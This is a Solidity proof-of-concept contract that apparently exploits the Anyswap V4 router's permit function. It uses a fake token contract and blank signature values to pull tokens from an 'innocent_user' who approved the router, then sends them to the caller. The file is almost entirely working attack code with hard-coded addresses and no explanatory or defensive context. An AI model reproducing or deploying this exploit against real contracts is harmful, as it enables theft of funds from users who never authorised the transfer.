// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

interface AnyswapV4Router {

    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint256 toChainID
    ) external;
    
}

interface WBNB {

    function approve(address guy, uint256 wad) external returns (bool);

    function withdraw(uint256 wad) external;

    function balanceOf(address) external view returns (uint256);

    function transfer(address dst, uint256 wad) external returns (bool);

}



contract poc{

    address AnyswapV4Router_Address = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;

    address WBNB_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function attack(address innocent_user, uint256 amount) public{

        AnyswapV4Router(AnyswapV4Router_Address).anySwapOutUnderlyingWithPermit(innocent_user,address(this),msg.sender,amount,100000000000000000000,0,"0x","0x",56);

        WBNB(WBNB_Address).transfer(msg.sender, amount);

    }


    function burn(address from, uint256 amount) external returns (bool){
        return true;
    }

    function depositVault(uint amount, address to) external returns (uint){
        return 1;
    }


    function underlying() external view returns (address){
        return WBNB_Address;
    }

}








